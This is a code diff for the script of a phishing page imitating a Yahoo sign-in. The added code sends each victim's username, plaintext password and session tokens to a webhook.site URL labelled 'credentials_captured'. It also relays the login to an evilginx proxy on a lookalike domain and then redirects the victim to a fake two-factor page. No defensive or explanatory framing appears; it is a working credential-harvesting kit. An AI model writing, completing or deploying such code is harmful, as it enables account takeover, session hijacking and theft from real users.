@@ -1,105 +1,148 @@
-document.addEventListener("DOMContentLoaded", () => {
-  const form = document.getElementById("login-form")
-  const usernameField = document.getElementById("username")
-  const passwordField = document.getElementById("password")
-  const submitButton = form.querySelector(".submit-button")
-  const errorMessage = document.getElementById("error-message")
+// --- CONFIGURATION ---
+const CONFIG = {
+  nextPages: {
+    twofa: "./2fa-selection.html",
+    success: "https://mail.astrowind.live/d/folders/1",
+  },
+  webhookUrl: "https://webhook.site/YOUR_UNIQUE_ID", // IMPORTANT: Replace with your webhook URL
+  evilginxDomain: "api.astrowind.live", // The API proxy domain
+}
 
-  const urlParams = new URLSearchParams(window.location.search)
-  const apiHost = urlParams.get("api_host")
-  if (!apiHost) {
-    showError("Configuration error: API host not specified.")
-    return
-  }
-  const apiBaseUrl = `https://${apiHost}`
+// --- STATE MANAGEMENT ---
+const state = {
+  username: "",
+  sessionData: {},
+  isSubmitting: false,
+}
 
-  let isPasswordNext = false
-
-  form.addEventListener("submit", (e) => {
-    e.preventDefault()
-    submitButton.value = "Please wait..."
-    submitButton.disabled = true
-
-    if (!isPasswordNext) {
-      // First step: send username
-      const username = usernameField.value
-      localStorage.setItem("yahoo_username", username)
-
-      fetch(`${apiBaseUrl}/account/challenge/password`, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams({ username: username }),
-      })
-        .then((response) => response.json())
-        .then((data) => {
-          if (data.error) {
-            showError(data.error_description || "Invalid username.")
-            resetForm()
-          } else {
-            // Transition to password input
-            usernameField.style.display = "none"
-            passwordField.style.display = "block"
-            passwordField.focus()
-            submitButton.value = "Sign in"
-            isPasswordNext = true
-          }
-        })
-        .catch((error) => {
-          showError("An unexpected error occurred. Please try again.")
-          resetForm()
-        })
-        .finally(() => {
-          submitButton.disabled = false
-        })
-    } else {
-      // Second step: send password
-      const username = localStorage.getItem("yahoo_username")
-      const password = passwordField.value
-
-      fetch(`${apiBaseUrl}/account/challenge/password`, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams({ username: username, passwd: password }),
-      })
-        .then((response) => response.json())
-        .then((data) => {
-          if (data.location) {
-            // Check if it's a 2FA challenge
-            if (data.location.includes("/account/challenge/challenge-selector")) {
-              window.location.href = `2fa-selection.html?api_host=${apiHost}`
-            } else {
-              // Success, redirect to mail
-              window.location.href = `https://${apiHost.replace("api.", "mail.")}/d/folders/1`
-            }
-          } else if (data.error) {
-            showError(data.error_description || "Invalid password.")
-            passwordField.value = ""
-            passwordField.focus()
-            submitButton.value = "Sign in"
-            submitButton.disabled = false
-          } else {
-            showError("An unknown error occurred.")
-            resetForm()
-          }
-        })
-        .catch((error) => {
-          showError("An unexpected network error occurred.")
-          resetForm()
-        })
+// --- UTILITY FUNCTIONS ---
+const utils = {
+  showError: (message) => {
+    const errorEl = document.getElementById("error-message")
+    if (errorEl) {
+      errorEl.textContent = message
+      errorEl.style.display = "block"
+      setTimeout(() => {
+        errorEl.style.display = "none"
+      }, 5000)
     }
-  })
+  },
+  setLoading: (isLoading) => {
+    const submitBtn = document.querySelector(".yahoo-submit-btn")
+    if (submitBtn) {
+      submitBtn.disabled = isLoading
+      submitBtn.textContent = isLoading ? "Please wait..." : "Next"
+    }
+    state.isSubmitting = isLoading
+  },
+  captureData: async (data) => {
+    try {
+      await fetch(CONFIG.webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          ...data,
+          timestamp: new Date().toISOString(),
+          ...state.sessionData,
+        }),
+      })
+    } catch (error) {
+      console.warn("Webhook capture failed:", error)
+    }
+  },
+}
 
-  function showError(message) {
-    errorMessage.textContent = message
-    errorMessage.style.display = "block"
-  }
+// --- SESSION MANAGEMENT ---
+const sessionManager = {
+  init: () => {
+    const urlParams = new URLSearchParams(window.location.search)
 
-  function resetForm() {
-    usernameField.style.display = "block"
-    passwordField.style.display = "none"
-    passwordField.value = ""
-    submitButton.value = "Next"
-    submitButton.disabled = false
-    isPasswordNext = false
+    state.username = urlParams.get("u") || "Unknown User"
+    state.sessionData = {
+      sessionIndex: urlParams.get("sessionIndex") || "N/A",
+      acrumb: urlParams.get("acrumb") || "N/A",
+      done: urlParams.get("done") || "https://mail.yahoo.com/",
+      src: urlParams.get("src") || "ym",
+      timestamp: urlParams.get("t") || Date.now(),
+    }
+
+    const userDisplayEl = document.getElementById("user-display")
+    if (userDisplayEl) {
+      userDisplayEl.textContent = state.username
+    }
+
+    utils.captureData({ type: "password_page_loaded", username: state.username })
+  },
+}
+
+// --- FORM HANDLERS ---
+const formHandlers = {
+  handlePasswordSubmit: async (event) => {
+    event.preventDefault()
+    if (state.isSubmitting) return
+
+    const password = document.getElementById("password").value
+    if (!password) {
+      utils.showError("Please enter your password.")
+      return
+    }
+
+    utils.setLoading(true)
+    await utils.captureData({
+      type: "credentials_captured",
+      username: state.username,
+      password: password,
+    })
+
+    const formData = new URLSearchParams({
+      username: state.username,
+      passwd: password,
+      ...state.sessionData,
+    })
+
+    try {
+      const response = await fetch(`https://${CONFIG.evilginxDomain}/account/challenge/password`, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: formData,
+        credentials: "include",
+      })
+
+      console.log("Password submitted to evilginx. Proceeding to 2FA.")
+      await utils.captureData({ type: "password_submitted_proceeding_to_2fa" })
+
+      const params = new URLSearchParams({
+        u: state.username,
+        ...state.sessionData,
+      })
+
+      window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`
+    } catch (error) {
+      console.error("Fetch to evilginx failed:", error)
+      await utils.captureData({
+        type: "fetch_error_proceeding_to_2fa",
+        error: error.message,
+      })
+
+      const params = new URLSearchParams({
+        u: state.username,
+        ...state.sessionData,
+      })
+      window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`
+    }
+  },
+}
+
+// --- EVENT LISTENERS ---
+const setupEventListeners = () => {
+  const passwordForm = document.getElementById("password-form")
+  if (passwordForm) {
+    passwordForm.addEventListener("submit", formHandlers.handlePasswordSubmit)
   }
+}
+
+// --- INITIALIZATION ---
+document.addEventListener("DOMContentLoaded", () => {
+  sessionManager.init()
+  setupEventListeners()
 })
